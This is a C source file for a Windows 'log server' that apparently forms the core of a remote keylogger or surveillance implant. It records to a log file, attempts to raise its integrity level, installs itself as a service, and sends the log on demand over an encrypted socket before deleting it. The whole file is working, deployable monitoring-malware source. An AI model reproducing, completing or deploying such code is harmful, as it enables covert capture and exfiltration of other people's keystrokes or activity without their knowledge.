/* 
 * main.c -- Log server main source file
 * 
 * Copyright (C) 2012  Martin Wolters
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#include <Windows.h>

#include "..\include\aes.h"
#include "..\include\install.h"
#include "..\include\logger.h"
#include "..\include\net.h"
#include "..\include\tommath.h"
#include "..\include\memory.h"

#define LOGFILE "log.txt"

static void SendLog(SOCKET s) {
	FILE *fp;
	size_t size, blocks, offs = 0;
	unsigned char buf[BUFSIZE];
	int zero = 0;
	
	if(StopLogger() == -1) goto send0;

	if((fp = fopen(LOGFILE, "r")) == NULL) goto restart;

	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	blocks = size / BUFSIZE;
	blocks += (size % BUFSIZE)?1:0;
	send(s, (char*)&blocks, sizeof(blocks), 0);

	while(size > BUFSIZE) {
		fseek(fp, offs, SEEK_SET);
		fread(buf, BUFSIZE, 1, fp);
		CryptSendData(s, buf, BUFSIZE);
		size -= BUFSIZE;
		offs += BUFSIZE;
	}
	if(size) {
		fseek(fp, offs, SEEK_SET);
		fread(buf, size, 1, fp);
		CryptSendData(s, buf, size);
	}

	fclose(fp);
	remove(LOGFILE);

restart:
	StartLogger(TEXT(LOGFILE));
send0:
	send(s, (char*)&zero, sizeof(zero), 0);
	return;
}

static void ServerLoop(SOCKET s) {
	SOCKET connected;
	int active, quit = 0;
	message_t msg;

	do {
		if((connected = accept(s, NULL, NULL)) == INVALID_SOCKET)
			continue;

		if(ServerHandshake(connected) == 1) {
			active = 1;
			do {				
				msg = CryptRecvMsg(connected);
				switch(msg.msg) {
					case MSG_PING:
						CryptSendMsg(connected, MSG_PONG, 0);
						break;
					case MSG_QUIN:
						CryptSendMsg(connected, MSG_QUIN, ilevel);
						break;
					case MSG_SLOG:
						CryptSendMsg(connected, MSG_DATA, 0);
						SendLog(connected);
						break;
					case MSG_QUIT:
						quit = 1;
						CryptSendMsg(connected, MSG_ACK, 0);
					case MSG_ERR:
						active = 0;
						break;
				}				
			} while(active);		
		}
		
		closesocket(connected);

		if(conn.dh_remote_key) {
			free(conn.dh_remote_key);
			conn.dh_remote_key = NULL;
		}
		if(conn.dh_shared_key) {
			free(conn.dh_shared_key);
			conn.dh_shared_key = NULL;
		}
		if(conn.nonce) {
			free(conn.nonce);
			conn.nonce = NULL;
		}
	} while(!quit);
}

int EntryPoint(void) {
	SOCKET s;

	StartLogger(TEXT(LOGFILE));
	
	if(StartWinsock() != 0)
		return -1;

	s = CreateListenSocket(SERVER_PORT);
	if((s == SOCKET_ERROR) || (s == INVALID_SOCKET))
		return -1;
	ServerLoop(s);

	WSACleanup();

	return 1;
}

void WINAPI Handler(DWORD fdwControl) { }

void ServiceMain(DWORD dwArgc, LPSTR *lpszArgv) {
	SERVICE_STATUS_HANDLE ssh = RegisterServiceCtrlHandlerA(SERVICE_NAME, &Handler);
	SERVICE_STATUS ss;

	if(ssh == (SERVICE_STATUS_HANDLE)0)
		return;

	ss.dwCheckPoint = 0;
	ss.dwControlsAccepted = 0;
	ss.dwCurrentState = SERVICE_RUNNING;
	ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
	ss.dwWaitHint = 0;
	ss.dwWin32ExitCode = NO_ERROR;

	SetServiceStatus(ssh, &ss);

	EntryPoint();

	ss.dwCheckPoint = 0;
	ss.dwControlsAccepted = 0;
	ss.dwCurrentState = SERVICE_STOPPED;
	ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
	ss.dwWaitHint = 0;
	ss.dwWin32ExitCode = NO_ERROR;

	SetServiceStatus(ssh, &ss);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {	
	SERVICE_TABLE_ENTRY ste[2];
#ifdef _DEBUG
	FILE *fp;
#endif

	GetIlevel();

	if(ilevel < 4) {
		TryRaiseIlevel();
	} else {
		ste[0].lpServiceName = TEXT(SERVICE_NAME);
		ste[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
		ste[1].lpServiceName = NULL;
		ste[1].lpServiceProc = NULL;

		if(StartServiceCtrlDispatcher(ste) > 0)
			return 0;
	}

	EntryPoint();
	
#ifdef _DEBUG
	if((fp = fopen("memlog.txt", "w")) != NULL) {
		showmemstats(fp);
		fclose(fp);
	}
#endif

	return 0;
}